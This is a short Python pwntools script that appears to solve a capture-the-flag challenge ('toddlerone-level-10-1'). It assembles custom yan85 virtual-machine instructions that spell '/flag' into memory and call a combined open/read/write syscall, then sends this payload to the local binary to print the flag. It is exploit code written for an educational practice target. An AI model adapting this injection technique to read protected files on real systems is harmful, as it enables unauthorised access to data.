from pwn import *
from yan85_asm import assemble

p = process("./toddlerone-level-10-1")

# first set of 4 instructions will just be junk cuz ip will already be at 5th
yancode_stage2 = """
IMM d 0x2f
IMM b 0x00
STM b d

IMM d 0x66
IMM b 0x01
STM b d

IMM d 0x6c
IMM b 0x02
STM b d

IMM d 0x61
IMM b 0x03
STM b d

IMM d 0x67
IMM b 0x04
STM b d

IMM d 0x00
IMM b 0x05
STM b d

IMM a 0x00
IMM b 0x00
IMM c 0xff
SYS 0x15, a
"""
# 0x15 = (SYS_OPEN | SYS_READ_MEM | SYS_WRITE)
"""
IMM c 0x64
SYS 0x20, c

IMM a 0x01
SYS 0x04, c
"""

code = assemble(yancode_stage2, order_str='arg2,op,arg1')

output = "".join([f"\\x{b:02x}" for b in code])
print(output)

print(p.clean())

payload = b""
payload += code

p.send(payload)

p.interactive()

p.close()
